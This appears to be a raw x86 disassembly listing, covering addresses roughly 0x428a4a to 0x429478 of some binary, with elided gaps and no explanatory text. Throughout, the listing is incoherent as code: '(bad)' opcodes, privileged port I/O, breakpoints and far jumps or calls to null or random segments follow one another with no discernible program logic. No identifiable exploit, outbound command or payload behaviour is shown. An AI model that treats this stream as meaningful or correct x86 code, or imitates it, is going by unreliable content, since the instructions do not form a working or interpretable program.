  428a4a:	push   ebx
  428a4b:	aas    
  428a4c:	icebp  
  428a4d:	adc    ah,ch
  428a4f:	inc    ebx
  428a50:	mov    dl,0xc0
  428a52:	jo     0x428a48
  428a54:	pop    edx
  428a55:	push   0xfffffff2
  428a57:	push   ss
  428a58:	(bad)  
  428a59:	pop    edx
  428a5a:	aad    0x62
  428a5c:	adc    bl,0xe1
  428a5f:	ins    DWORD PTR es:[edi],dx
  428a60:	add    al,0x26
  428a62:	sub    ecx,DWORD PTR [ebp+0xc]
  428a65:	fstp   QWORD PTR [edi+0x7249bf8d]
  428a6b:	pop    esi
  428a6c:	scas   eax,DWORD PTR es:[edi]
	...
  428ad5:	add    BYTE PTR [ebp+0xc],cl
  428ad8:	clc    
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x2c03ca13]
  428ae5:	fmul   QWORD PTR [edx-0xfffe4d]
  428aeb:	add    BYTE PTR [eax],al
  428aed:	add    cl,ah
  428aef:	hlt    
  428af0:	pop    edx
  428af1:	pop    es
  428af2:	(bad)  
  428af3:	sub    DWORD PTR [edi+0x5d],ebx
  428af6:	jne    0x428ad7
  428af8:	push   ebx
  428af9:	pop    es
  428afa:	test   al,0xdc
  428afc:	rep lods eax,DWORD PTR ds:[esi]
  428afe:	fwait
  428aff:	xor    ebp,0x4f
  428b02:	xchg   ecx,eax
  428b03:	sti    
  428b04:	lds    eax,FWORD PTR [eax+eiz*8-0x61c5fe52]
  428b0b:	or     ebp,DWORD PTR [esi+ecx*1]
  428b0e:	or     eax,0x16875484
  428b13:	add    eax,0xa9636f19
  428b18:	mov    eax,ds:0x2af89acb
  428b1d:	mov    dh,0x75
  428b1f:	sahf   
  428b20:	xor    eax,0xcb39d981
  428b25:	add    ch,BYTE PTR [edi-0x14]
  428b28:	popa   
  428b29:	or     ebx,DWORD PTR [ebx-0x42]
  428b2c:	mov    bh,0xa0
  428b2e:	dec    eax
  428b2f:	fidivr DWORD PTR [ecx+0x7270643e]
  428b35:	int3   
  428b36:	lods   al,BYTE PTR ds:[esi]
  428b37:	inc    esi
  428b38:	inc    ebp
  428b39:	ins    DWORD PTR es:[edi],dx
  428b3a:	jecxz  0x428ad8
  428b3c:	out    0x1b,al
  428b3e:	push   ds
  428b3f:	sbb    DWORD PTR [eax+0x569a8568],0x3d668537
  428b49:	out    0x22,eax
  428b4b:	loope  0x428b0a
  428b4d:	cwde   
  428b4e:	test   eax,esp
  428b50:	xor    DWORD PTR [edx+0x6b],ecx
  428b53:	push   esp
  428b54:	iret   
  428b55:	nop
  428b56:	iret   
  428b57:	(bad)  
  428b58:	fist   DWORD PTR [ecx+0x52ece75f]
  428b5e:	xchg   BYTE PTR [edx],ah
  428b60:	in     al,0xb0
  428b62:	ins    DWORD PTR es:[edi],dx
  428b63:	js     0x428b74
  428b65:	lods   eax,DWORD PTR ds:[esi]
  428b66:	or     eax,0xcd68f655
  428b6b:	push   eax
  428b6c:	or     al,0x1b
  428b6e:	push   ds
  428b6f:	ficom  DWORD PTR ds:[edx]
  428b72:	out    dx,al
  428b73:	jmp    0x428be3
  428b75:	inc    edx
  428b76:	int3   
  428b77:	adc    bl,BYTE PTR [eax+0xd]
  428b7a:	xor    al,0xa6
  428b7c:	pop    edx
  428b7d:	adc    bl,BYTE PTR [ecx]
  428b7f:	fcmovnb st,st(3)
  428b81:	xchg   BYTE PTR [ebp-0x18],al
  428b84:	xor    ah,BYTE PTR [eax+0x2a]
  428b87:	retf   
  428b88:	xor    cl,BYTE PTR [edi+0x45f73dd7]
  428b8e:	adc    BYTE PTR [edx],0xd0
  428b91:	stc    
  428b92:	inc    ebx
  428b93:	into   
  428b94:	add    bh,ch
  428b96:	add    esp,esp
  428b98:	xchg   edx,eax
  428b99:	inc    edx
  428b9a:	xor    BYTE PTR [esi+edx*2-0x2518eb47],ch
  428ba1:	and    BYTE PTR [ecx+0x67],bl
  428ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ba5:	xchg   ebp,eax
  428ba6:	ss inc edx
  428ba8:	push   cs
  428ba9:	xor    BYTE PTR [esi+0x2526747e],dl
  428baf:	push   edx
  428bb0:	cld    
  428bb1:	mov    ebp,0x3af0fb66
  428bb6:	arpl   WORD PTR [edx],dx
  428bb8:	adc    BYTE PTR [edi+edi*2],dh
  428bbb:	dec    edi
  428bbc:	dec    edx
  428bbd:	loope  0x428c13
  428bbf:	push   ss
  428bc0:	push   esi
  428bc1:	pop    ecx
  428bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428bc3:	xor    eax,esi
  428bc5:	out    dx,eax
  428bc6:	jo     0x428b58
  428bc8:	sbb    esp,DWORD PTR [eax-0x2b7ba79e]
  428bce:	or     eax,0x8cbe5ffc
  428bd3:	ins    BYTE PTR es:[edi],dx
  428bd4:	dec    eax
  428bd5:	adc    dh,BYTE PTR [ecx+0x7]
  428bd8:	fidiv  WORD PTR [ebx+0x26]
  428bdb:	add    BYTE PTR [ecx-0x4],ah
  428bde:	jge    0x428bb7
  428be0:	push   esi
  428be1:	sub    DWORD PTR [esi+0x23f90db8],eax
  428be7:	xchg   esp,eax
  428be8:	and    eax,0x327457ca
	...
  428c55:	add    ch,al
  428c57:	push   ebp
  428c58:	mov    bh,dl
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0xdfc8a15d
  428c66:	mov    DWORD PTR [ecx+eax*1+0xff00],esi
  428c6d:	add    ah,bl
  428c6f:	mov    ecx,0xb6c5394c
  428c74:	out    dx,eax
  428c75:	pop    ebx
  428c76:	or     edx,DWORD PTR [edi+0x9]
  428c79:	fdivrp st(4),st
  428c7b:	lods   eax,DWORD PTR ds:[esi]
  428c7c:	outs   dx,BYTE PTR ds:[esi]
  428c7d:	add    ebp,DWORD PTR [ebx-0x4caf48de]
  428c83:	xor    eax,0xb1ca94d4
  428c88:	out    dx,al
  428c89:	dec    BYTE PTR [ebp+edx*4-0x4a]
  428c8d:	leave  
  428c8e:	or     al,0xbc
  428c90:	mov    ecx,0x3fd589f2
  428c95:	cs jl  0x428ca2
  428c98:	ins    BYTE PTR es:[edi],dx
  428c99:	cmp    edi,DWORD PTR [edx-0xe94cbfe]
  428c9f:	(bad)  
  428ca1:	ror    ebp,0xda
  428ca4:	fcom   QWORD PTR [esi+0x5b944bc]
  428caa:	nop
  428cab:	push   edi
  428cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cad:	nop
  428cae:	add    edx,edi
  428cb0:	rol    DWORD PTR [ebp-0x9],1
  428cb3:	mov    ds:0x62c2dfe2,al
  428cb8:	jecxz  0x428cd4
  428cba:	mov    bh,0xbd
  428cbc:	cdq    
  428cbd:	mov    ebp,0x2ae2650a
  428cc2:	test   DWORD PTR [esi],esp
  428cc4:	jae    0x428cef
  428cc6:	shr    BYTE PTR [esi],cl
  428cc8:	cld    
  428cc9:	cmp    cl,ah
  428ccb:	fs jno 0x428d29
  428cce:	hlt    
  428ccf:	mov    bh,0x7f
  428cd1:	and    BYTE PTR [ebp+0x35],ah
  428cd4:	dec    edx
  428cd5:	jge    0x428cb5
  428cd7:	mov    cl,0xfe
  428cd9:	jecxz  0x428cc8
  428cdb:	adc    edx,eax
  428cdd:	(bad)  
  428cde:	push   ebp
  428cdf:	addr16 mov ch,0x9
  428ce2:	js     0x428cee
  428ce4:	dec    esi
  428ce5:	or     DWORD PTR [esi+0x74],ebx
  428ce8:	pop    esi
  428ce9:	sbb    cl,BYTE PTR [edi+0x31742fdb]
  428cef:	sub    dh,BYTE PTR [eax-0x42a63bc7]
  428cf5:	fisttp DWORD PTR [ecx+0x364f6a0d]
  428cfb:	jbe    0x428d5d
  428cfd:	out    dx,al
  428cfe:	ror    DWORD PTR [esi+edi*8-0x7be4f5f4],cl
  428d05:	ja     0x428d3c
  428d07:	ror    ecx,0xe9
  428d0a:	ins    BYTE PTR es:[edi],dx
  428d0b:	cwd    
  428d0d:	(bad)  
  428d0e:	ins    DWORD PTR es:[edi],dx
  428d0f:	mov    al,0xe5
  428d11:	repz xchg esi,eax
  428d13:	int3   
  428d14:	retf   0x4f65
  428d17:	sub    dl,BYTE PTR [ebx]
  428d19:	push   ebp
  428d1a:	or     BYTE PTR [ecx-0xb],ah
  428d1d:	add    bh,ch
  428d1f:	fyl2x  
  428d21:	mov    dl,0x25
  428d23:	sub    eax,0x5e6de4a7
  428d28:	outs   dx,DWORD PTR ds:[esi]
  428d29:	mov    ebx,ebp
  428d2b:	or     al,0x71
  428d2d:	inc    ecx
  428d2e:	loop   0x428d3f
  428d30:	mov    ch,0xb9
  428d32:	pop    edi
  428d33:	leave  
  428d34:	int    0xb0
  428d36:	pop    esp
  428d37:	push   ecx
  428d39:	imul   edx,DWORD PTR ds:0xce51f16c,0x72
  428d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d41:	cmp    dl,ch
  428d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d44:	cmp    eax,edx
  428d46:	mov    DWORD PTR [edi-0x5],esi
  428d49:	js     0x428ce3
  428d4b:	fld    QWORD PTR [eax-0x291f4fd7]
  428d51:	dec    esi
  428d52:	out    0x3b,al
  428d54:	faddp  st(3),st
  428d56:	lds    ecx,FWORD PTR [esi]
  428d58:	ret    0x1af6
  428d5b:	lods   eax,DWORD PTR ds:[esi]
  428d5c:	sbb    BYTE PTR [edi],dh
  428d5e:	stos   BYTE PTR es:[edi],al
  428d5f:	or     eax,DWORD PTR [ecx-0x4d32cdbc]
  428d65:	cld    
  428d66:	inc    eax
  428d67:	shl    DWORD PTR [esi-0x7fb9536d],cl
	...
  428dd5:	add    BYTE PTR [ecx-0xace0e4b],al
  428ddb:	jne    0x428d9e
  428ddd:	mov    ch,0x90
  428ddf:	int3   
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0xa807
  428de4:	out    dx,al
  428de5:	(bad)  [eax-0xfffe4b]
  428deb:	add    BYTE PTR [eax],al
  428ded:	add    BYTE PTR [ecx+0x73],bl
  428df0:	adc    ch,bl
  428df2:	dec    ecx
  428df3:	sub    al,0xf4
  428df5:	adc    bl,ch
  428df7:	data16 scas al,BYTE PTR es:[edi]
  428df9:	mov    eax,0x7475cb5a
  428dfe:	popa   
  428dff:	mov    esi,0x8fa4b91c
  428e04:	fidivr WORD PTR [ecx]
  428e06:	jno    0x428dc6
  428e08:	retf   0x842e
  428e0b:	mov    ecx,0x59abda37
  428e10:	int3   
  428e11:	pop    ss
  428e12:	stos   BYTE PTR es:[edi],al
  428e13:	test   esp,esi
  428e15:	add    al,0x1b
  428e17:	push   esp
  428e18:	dec    edi
  428e19:	mov    al,bh
  428e1b:	ret    0xf4b2
  428e1e:	(bad)  [eax]
  428e20:	jb     0x428df2
  428e22:	test   al,0x4e
  428e24:	ins    DWORD PTR es:[edi],dx
  428e25:	retf   
  428e26:	add    DWORD PTR [eax-0x2e],ebx
  428e29:	dec    edi
  428e2a:	jbe    0x428e0b
  428e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e2d:	xchg   esp,eax
  428e2e:	ins    DWORD PTR es:[edi],dx
  428e2f:	test   al,ch
  428e31:	ror    ecx,cl
  428e33:	adc    edx,edi
  428e35:	and    ah,bl
  428e37:	adc    eax,0xcdefc19c
  428e3c:	inc    edx
  428e3d:	mov    cl,0x13
  428e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e40:	mov    ebx,0x71db1a07
  428e45:	and    dh,bh
  428e47:	loopne 0x428eac
  428e49:	shr    DWORD PTR [edi-0x11b57745],1
  428e4f:	pop    ss
  428e50:	jecxz  0x428e61
  428e52:	and    ecx,DWORD PTR [eax]
  428e54:	loopne 0x428e81
  428e56:	cmp    al,0xdb
  428e58:	fcmovnbe st,st(6)
  428e5a:	adc    eax,0xb0e6b557
  428e5f:	addr16 inc esp
  428e61:	mov    DWORD PTR [esi-0xb],edi
  428e64:	sbb    DWORD PTR [esp+edi*8-0x242b81de],0xfffffffe
  428e6c:	xor    al,0xd4
  428e6e:	mov    dh,0xf8
  428e70:	inc    edx
  428e71:	jne    0x428ebc
  428e73:	mov    cl,BYTE PTR [ecx+eax*2]
  428e76:	stos   BYTE PTR es:[edi],al
  428e77:	icebp  
  428e78:	fisttp WORD PTR [edx]
  428e7a:	sub    edx,ebx
  428e7c:	mov    ebp,0x573795b0
  428e81:	push   ds
  428e82:	neg    BYTE PTR [ecx]
  428e84:	push   0x331d993b
  428e89:	packssdw mm7,mm6
  428e8c:	rcl    BYTE PTR [edi],1
  428e8e:	cld    
  428e8f:	xchg   edx,eax
  428e90:	or     BYTE PTR ds:0xf8b4fb1e,al
  428e96:	cs int 0x7d
  428e99:	jecxz  0x428e9b
  428e9b:	jge    0x428e2b
  428e9d:	jl     0x428e72
  428e9f:	dec    esp
  428ea0:	dec    ebx
  428ea1:	out    0x87,eax
  428ea3:	out    dx,eax
  428ea4:	dec    ebx
  428ea5:	xor    ah,BYTE PTR [eax]
  428ea7:	loope  0x428f1f
  428ea9:	cmp    al,0x67
  428eab:	ficom  WORD PTR [eax+0x6d]
  428eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428eaf:	push   ebp
  428eb0:	das    
  428eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428eb2:	sbb    ch,al
  428eb4:	xchg   ecx,eax
  428eb5:	jl     0x428e5d
  428eb7:	mov    al,0xd7
  428eb9:	and    eax,0x1930542d
  428ebe:	lods   eax,DWORD PTR ds:[esi]
  428ebf:	push   eax
  428ec0:	arpl   si,bx
  428ec2:	inc    ecx
  428ec3:	or     al,bl
  428ec5:	mov    ds:0xd18c55cf,eax
  428eca:	ins    DWORD PTR es:[edi],dx
  428ecb:	push   0x888fc794
  428ed0:	lahf   
  428ed1:	outs   dx,DWORD PTR ds:[esi]
  428ed2:	and    DWORD PTR [ebx+0x1594c664],0xb9ae5e28
  428edc:	mov    gs,WORD PTR ds:0x8bb61a24
  428ee2:	and    DWORD PTR [edx+0x68],ebx
  428ee5:	outs   dx,DWORD PTR ds:[esi]
  428ee6:	adc    cl,BYTE PTR [ebp-0x83189dd]
  428eec:	ret    
	...
  428f55:	add    BYTE PTR [edi+0x5d],cl
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x83
  428f63:	ret    
  428f64:	xchg   BYTE PTR [edi],al
  428f66:	xchg   DWORD PTR [esi+0xff0001],esi
  428f6c:	add    BYTE PTR [eax],al
  428f6e:	jns    0x428f84
  428f70:	pop    edi
  428f71:	jbe    0x428f7f
  428f73:	es push es
  428f75:	xor    BYTE PTR [ebx+eiz*2-0x7d7eec45],0xe0
  428f7d:	mov    ss,WORD PTR [ecx-0x1b]
  428f80:	dec    ecx
  428f81:	xor    DWORD PTR [esp+ecx*1-0x4b0c48ee],eax
  428f88:	xor    eax,0x2dec307d
  428f8d:	sti    
  428f8e:	std    
  428f8f:	xchg   esp,eax
  428f90:	and    DWORD PTR [ebx-0x46],ebx
  428f93:	pop    edx
  428f94:	loopne 0x428fef
  428f96:	ins    BYTE PTR es:[edi],dx
  428f97:	test   eax,0x2233eaa0
  428f9c:	stos   BYTE PTR es:[edi],al
  428f9d:	or     ebp,eax
  428f9f:	int    0x3c
  428fa1:	push   esi
  428fa2:	jmp    0x7206:0xb166091
  428fa9:	push   edi
  428faa:	scas   al,BYTE PTR es:[edi]
  428fab:	rol    DWORD PTR [esi],0x4b
  428fae:	lea    eax,[eax+0x45]
  428fb1:	dec    ecx
  428fb2:	push   edx
  428fb3:	sbb    al,0x5a
  428fb5:	nop
  428fb6:	mov    eax,cs:0xf773e44e
  428fbc:	and    ch,BYTE PTR [ecx]
  428fbe:	inc    edx
  428fbf:	add    DWORD PTR [esi],ebx
  428fc1:	sub    al,BYTE PTR [bx-0x43]
  428fc5:	stc    
  428fc6:	xchg   esi,eax
  428fc7:	fidiv  WORD PTR [esi]
  428fc9:	in     eax,dx
  428fca:	fwait
  428fcb:	add    DWORD PTR ds:0xf6c803c8,esp
  428fd1:	and    cl,BYTE PTR [eax]
  428fd3:	push   0xffffffb9
  428fd5:	daa    
  428fd6:	ins    BYTE PTR es:[edi],dx
  428fd7:	sahf   
  428fd8:	xor    edi,DWORD PTR [esi+0x285e0871]
  428fde:	retf   
  428fdf:	mov    esp,DWORD PTR ds:0xc95be102
  428fe5:	imul   ecx,DWORD PTR [ecx-0x1ccc260a],0xd3305dad
  428fef:	popf   
  428ff0:	fxch   st(4)
  428ff2:	daa    
  428ff3:	mov    dh,0xf2
  428ff5:	cmp    al,0xcc
  428ff7:	test   eax,0x59d50742
  428ffc:	frstor [ebp-0x399d9f35]
  429002:	daa    
  429003:	sbb    cl,dh
  429005:	or     eax,0x39305385
  42900a:	jl     0x428fbc
  42900c:	test   DWORD PTR [eax],edx
  42900e:	jbe    0x428fca
  429010:	dec    esp
  429011:	xchg   edx,eax
  429012:	outs   dx,BYTE PTR ds:[esi]
  429013:	ret    0xdf51
  429016:	add    esi,esi
  429018:	push   0xbb4072df
  42901d:	dec    eax
  42901e:	cmc    
  42901f:	icebp  
  429020:	xor    esi,ebp
  429022:	arpl   WORD PTR [ebp+0x32],ax
  429025:	push   cs
  429026:	inc    esp
  429027:	adc    cl,BYTE PTR [ecx-0x478c0933]
  42902d:	icebp  
  42902e:	mov    dh,0x2b
  429030:	scas   eax,DWORD PTR es:[edi]
  429031:	call   0x4fa2:0xac182f5a
  429038:	dec    edx
  429039:	ret    0x8e9f
  42903c:	cli    
  42903d:	pop    ss
  42903e:	scas   al,BYTE PTR es:[edi]
  42903f:	(bad)  
  429040:	cmc    
  429041:	adc    al,0xf7
  429043:	sbb    esp,DWORD PTR [ebx-0x76fdf9bd]
  429049:	sbb    edx,esp
  42904b:	push   edi
  42904c:	jns    0x42900c
  42904e:	clc    
  42904f:	clc    
  429050:	xchg   esi,eax
  429051:	ins    BYTE PTR es:[edi],dx
  429052:	mov    al,0x42
  429054:	inc    esp
  429055:	or     esi,0xffffff9f
  429058:	fisttp DWORD PTR [ecx+edx*4+0x23858669]
  42905f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429060:	inc    esi
  429061:	imul   eax,DWORD PTR [edx],0x394abef6
  429067:	xor    ecx,DWORD PTR [ebp-0x53]
  42906a:	sub    esi,ebp
  42906c:	call   0x0:0x0
	...
  4290d3:	add    BYTE PTR [eax],al
  4290d5:	add    cl,ah
  4290d7:	in     al,dx
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x1efc7b77
  4290e3:	iret   
  4290e4:	mov    al,ds:0x1b7866d
  4290e9:	add    bh,bh
  4290eb:	add    BYTE PTR [eax],al
  4290ed:	add    bh,cl
  4290ef:	jno    0x4290b4
  4290f1:	mov    eax,ds:0x3ee59988
  4290f6:	jb     0x42915e
  4290f8:	lock loop 0x4290f6
  4290fb:	mov    ds:0xaf9f136b,al
  429100:	add    bh,bl
  429102:	rcl    BYTE PTR [eax-0x569fea7b],1
  429108:	pop    edi
  429109:	cwde   
  42910a:	jmp    0x4290ae
  42910c:	pop    ds
  42910d:	pop    edi
  42910e:	mov    ah,0xf9
  429110:	repnz mov dl,0xe8
  429113:	out    0xc6,al
  429115:	pop    edx
  429116:	inc    ebx
  429117:	add    BYTE PTR [edi-0x25975129],0x64
  42911e:	pop    ebx
  42911f:	sbb    al,0xac
  429121:	jle    0x4290f7
  429123:	jae    0x4290ed
  429125:	out    0xb9,al
  429127:	sbb    al,0x52
  429129:	(bad)  
  42912a:	fiadd  DWORD PTR [edx-0xd]
  42912d:	mov    al,0x4b
  42912f:	rcl    DWORD PTR [ecx-0x51d35dc],1
  429135:	mov    al,ds:0xe1f38dba
  42913a:	out    0x42,eax
  42913c:	lahf   
  42913d:	inc    eax
  42913e:	int3   
  42913f:	in     eax,0x44
  429141:	push   0x7d2691bf
  429146:	mov    dh,0xf9
  429148:	mov    ecx,0x12fddedd
  42914d:	xor    al,0xfa
  42914f:	jecxz  0x42910c
  429151:	pop    eax
  429152:	dec    ecx
  429153:	add    BYTE PTR [ecx-0x5a52d0c0],ah
  429159:	dec    esi
  42915a:	jno    0x4291a1
  42915c:	adc    DWORD PTR [ecx+0x61],ebx
  42915f:	push   ebp
  429160:	mov    edi,0xf822ea88
  429165:	pop    es
  429166:	test   BYTE PTR [ebp+0x79bde980],bh
  42916c:	les    esi,FWORD PTR [eax+0x40bc7574]
  429172:	dec    edx
  429173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429174:	sub    esp,DWORD PTR [edx+ebp*2-0x530dff20]
  42917b:	scas   eax,DWORD PTR es:[edi]
  42917c:	jno    0x42913b
  42917e:	aam    0xac
  429180:	std    
  429181:	mov    ebp,0x22347bf8
  429186:	mul    DWORD PTR [edi-0x18]
  429189:	jbe    0x429192
  42918b:	sar    BYTE PTR [edx+ebx*4+0x19],0xa8
  429190:	jne    0x4291d9
  429192:	add    ecx,DWORD PTR [ebp+0x1f022af8]
  429198:	stc    
  429199:	shl    BYTE PTR ds:0x3af07a49,0xc9
  4291a0:	shl    BYTE PTR [ecx],cl
  4291a2:	pop    ss
  4291a3:	call   0xf53b5b39
  4291a8:	mov    bl,0xa9
  4291aa:	int    0x48
  4291ac:	lds    esp,FWORD PTR [ebp+0x4a09bfbb]
  4291b2:	jmp    0x6126ede5
  4291b7:	in     eax,0xee
  4291b9:	dec    eax
  4291ba:	sub    al,bh
  4291bc:	scas   al,BYTE PTR es:[edi]
  4291bd:	add    eax,0x465daa61
  4291c2:	cs inc edx
  4291c4:	sub    DWORD PTR ds:0x799b4125,edi
  4291ca:	enter  0x7d50,0xc2
  4291ce:	pushf  
  4291cf:	je     0x4291bf
  4291d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4291d2:	in     al,0x66
  4291d4:	mov    ds:0x5f39c5b3,eax
  4291d9:	repz inc ebx
  4291db:	push   ds
  4291dc:	inc    esp
  4291dd:	pop    ebx
  4291de:	in     eax,0x59
  4291e0:	icebp  
  4291e1:	xlat   BYTE PTR ds:[ebx]
  4291e2:	mov    ch,0xf4
  4291e4:	pop    ecx
  4291e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4291e6:	(bad)  
  4291e7:	adc    ecx,DWORD PTR [eax-0x29]
  4291ea:	mov    bh,0xb0
  4291ec:	jmp    0x0:0x0
	...
  429253:	add    BYTE PTR [eax],al
  429255:	add    BYTE PTR [esi-0x79],dl
  429258:	std    
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [ebx+ecx*8-0x7aa28256],0xff0001b8
  42926b:	add    BYTE PTR [eax],al
  42926d:	add    dl,ch
  42926f:	je     0x4291f9
  429271:	shl    BYTE PTR [edi+esi*2],0xbe
  429275:	jge    0x4292c2
  429277:	loopne 0x429203
  429279:	add    edx,DWORD PTR [edi+0x87e687]
  42927f:	ficomp WORD PTR [ecx+0x70]
  429282:	mov    dh,0x36
  429284:	add    bh,0xa2
  429287:	mov    dl,0x7f
  429289:	push   ss
  42928a:	xor    ebx,DWORD PTR [eax+0x3d]
  42928d:	mov    eax,ds:0x17a965c2
  429292:	jmp    0x4292ee
  429294:	lods   eax,DWORD PTR ds:[esi]
  429295:	mov    cl,0x29
  429297:	sub    BYTE PTR [ebx+0xb],dh
  42929a:	jnp    0x429284
  42929c:	xchg   ecx,eax
  42929d:	rcr    esp,1
  42929f:	sbb    eax,0x931355f3
  4292a4:	xchg   ch,dl
  4292a6:	in     al,dx
  4292a7:	lds    ecx,FWORD PTR [eax-0x26f2dffc]
  4292ad:	add    BYTE PTR [ebx],dl
  4292af:	stc    
  4292b0:	daa    
  4292b1:	mov    ebp,0x83057765
  4292b6:	ds jo  0x4292e9
  4292b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292ba:	sub    al,BYTE PTR [esi-0x1ac631eb]
  4292c0:	rcl    DWORD PTR [edx],1
  4292c2:	hlt    
  4292c3:	sbb    esp,DWORD PTR [edx-0x54]
  4292c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292c7:	cmp    edx,ebp
  4292c9:	add    BYTE PTR [ecx+edx*8+0x2c],ch
  4292cd:	out    dx,eax
  4292ce:	or     BYTE PTR [esp+eiz*8+0x61],ah
  4292d2:	fiadd  DWORD PTR [eax]
  4292d4:	les    edi,FWORD PTR [edi-0x70aa57f3]
  4292da:	xchg   esp,eax
  4292db:	mov    dh,0xf
  4292dd:	test   BYTE PTR [edi-0x4a],0x27
  4292e1:	mov    eax,0x5c80cf3d
  4292e6:	cmp    al,0x39
  4292e8:	call   0xfb5a29c3
  4292ed:	jmp    0xfb40ea20
  4292f2:	mov    dl,0xe7
  4292f4:	(bad)  
  4292f5:	xlat   BYTE PTR ds:[ebx]
  4292f6:	or     BYTE PTR [edi+0x4b],dh
  4292f9:	sti    
  4292fa:	cmp    al,0x7c
  4292fc:	inc    ecx
  4292fd:	(bad)  
  4292fe:	cld    
  4292ff:	xchg   ebx,eax
  429300:	cli    
  429301:	xor    BYTE PTR [esi+0x6cc16d17],0x29
  429308:	inc    ebx
  429309:	xchg   ebx,eax
  42930a:	or     al,0x91
  42930c:	push   ebx
  42930d:	xor    DWORD PTR [eax+0x458545f7],ecx
  429313:	jae    0x429303
  429315:	clc    
  429316:	fwait
  429317:	and    ebx,DWORD PTR [edx+0x6f]
  42931a:	cmp    al,0x4a
  42931c:	push   eax
  42931d:	or     cl,BYTE PTR [ebx]
  42931f:	das    
  429320:	addr16 loop 0x4292f5
  429323:	sub    DWORD PTR [ebp+0x59],ebp
  429326:	in     eax,dx
  429327:	cmc    
  429328:	add    al,0x47
  42932a:	fisub  DWORD PTR [ebp-0x58]
  42932d:	imul   BYTE PTR [eax+0x3edcc829]
  429333:	outs   dx,DWORD PTR ds:[esi]
  429334:	(bad)  [ebx]
  429336:	inc    edx
  429337:	(bad)  
  429338:	(bad)
  42933b:	retf   
  42933c:	pop    ds
  42933d:	cmc    
  42933e:	sahf   
  42933f:	cs push ecx
  429341:	sar    BYTE PTR [ecx+eax*8+0x4c82b341],cl
  429348:	jge    0x4292f7
  42934a:	aad    0x26
  42934c:	or     eax,0x4b19f8f6
  429351:	xor    esi,DWORD PTR [ecx]
  429353:	jno    0x42937a
  429355:	retf   0x783d
  429358:	xor    BYTE PTR [ebx+0x3b],dl
  42935b:	jp     0x42937c
  42935d:	int3   
  42935e:	jne    0x42931f
  429360:	mov    eax,ds:0x9c3819aa
  429365:	loope  0x4293e5
  429367:	arpl   WORD PTR [edx],si
  429369:	into   
  42936a:	sub    eax,0x650c
	...
  4293d3:	add    BYTE PTR [eax],al
  4293d5:	add    al,dh
  4293d7:	adc    al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0xa1
  4293e3:	push   ecx
  4293e4:	hlt    
  4293e5:	sub    eax,DWORD PTR [ecx+edi*4+0xff0001]
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	shr    BYTE PTR [ebx],cl
  4293f0:	push   ebx
  4293f1:	ficom  DWORD PTR [ebp-0xf7a3084]
  4293f7:	int    0x70
  4293f9:	cli    
  4293fa:	xchg   BYTE PTR [ebx],dl
  4293fc:	xchg   esi,eax
  4293fd:	xor    DWORD PTR [ebx],eax
  4293ff:	fs or  eax,0x12149689
  429405:	sbb    BYTE PTR ds:0x98d70730,ah
  42940b:	jo     0x429421
  42940d:	retf   
  42940e:	push   edx
  42940f:	or     dh,BYTE PTR [ebp+0x6ff1a470]
  429415:	xor    dh,BYTE PTR es:[edx]
  429418:	cmp    al,al
  42941a:	jge    0x4293e3
  42941c:	(bad)  
  42941d:	or     al,0xa5
  42941f:	xlat   BYTE PTR ds:[ebx]
  429420:	inc    ecx
  429421:	stos   BYTE PTR es:[edi],al
  429422:	cld    
  429423:	es sub eax,0x7fb5a720
  429429:	push   edx
  42942a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42942b:	lahf   
  42942c:	aam    0x9d
  42942e:	push   0xc931acf0
  429433:	pop    es
  429434:	fwait
  429435:	lea    ebx,[esi]
  429437:	sar    DWORD PTR [ebp+esi*8+0x29],0xd3
  42943c:	and    DWORD PTR [edx-0x38],edx
  42943f:	sbb    esi,esp
  429441:	push   ebx
  429442:	fwait
  429443:	in     al,0x7d
  429445:	fld    TBYTE PTR [ecx+0x390aa7b4]
  42944b:	sahf   
  42944c:	jb     0x429477
  42944e:	test   BYTE PTR [esi+0x65],cl
  429451:	das    
  429452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429453:	adc    DWORD PTR [ebp+eax*4+0x53],0x444b16e3
  42945b:	jbe    0x429473
  42945d:	pop    eax
  42945e:	test   eax,0xc7982f8a
  429463:	fidiv  DWORD PTR [edx+0x1e]
  429466:	dec    eax
  429467:	push   ebp
  429468:	push   ecx
  429469:	stos   BYTE PTR es:[edi],al
  42946a:	std    
  42946b:	inc    esp
  42946c:	lods   eax,DWORD PTR ds:[esi]
  42946d:	xchg   edx,eax
  42946e:	jmp    0x6284:0x92ae8831
  429475:	lds    ecx,FWORD PTR [ecx+0x68]
  429478:	or     al,BYTE PTR [eax]
